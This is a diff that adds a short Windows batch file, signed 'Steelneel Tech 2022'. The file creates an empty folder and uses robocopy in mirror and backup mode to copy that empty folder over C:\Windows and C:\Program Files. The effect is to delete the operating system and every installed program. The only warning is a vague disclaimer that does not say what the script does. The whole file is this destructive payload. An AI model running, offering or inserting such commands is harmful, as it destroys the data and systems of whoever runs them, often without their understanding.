@@ -1,0 +1,9 @@
+md c:\blank
+
+robocopy c:\blank c:\windows /b /mir /w:0 /r:0
+
+robocopy c:\blank "C:\program files" /b /mir /r:0 /w:0
+
+
+:: Disclaimer we are not responsible for any harm done to your computer. Run this file at your own risk.
+:: Steelneel Tech 2022
